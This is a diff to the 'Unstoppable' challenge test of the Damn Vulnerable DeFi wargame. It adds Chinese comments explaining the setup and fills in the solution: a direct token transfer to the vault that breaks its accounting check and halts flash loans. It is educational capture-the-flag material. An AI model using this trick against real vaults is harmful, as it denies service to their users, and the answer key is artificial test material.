@@ -29,20 +29,28 @@ contract UnstoppableChallenge is Test {
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
     function setUp() public {
+        /*
+        相当于:
+        vm.deal(deployer, 2 ** 128);
+        vm.startPrank(deployer);
+        */
         startHoax(deployer);
         // Deploy token and vault
+        // DVT部署的时候会给sender授权无限额度, 即deployer拥有DVT的无限额度
         token = new DamnValuableToken();
+        // asset = DVT, share = tDVT
         vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
 
-        // Deposit tokens to vault
+        // Deployer在Vault质押1,000,000 DVT
         token.approve(address(vault), TOKENS_IN_VAULT);
         vault.deposit(TOKENS_IN_VAULT, address(deployer));
 
-        // Fund player's account with initial token balance
+        // player拥有10 DVT
         token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
 
         // Deploy monitor contract and grant it vault's ownership
         monitorContract = new UnstoppableMonitor(address(vault));
+        // monitor是Vault的owner
         vault.transferOwnership(address(monitorContract));
 
         // Monitor checks it's possible to take a flash loan
@@ -91,7 +99,7 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        token.transfer(address(vault), 1 ether);
     }
 
     /**
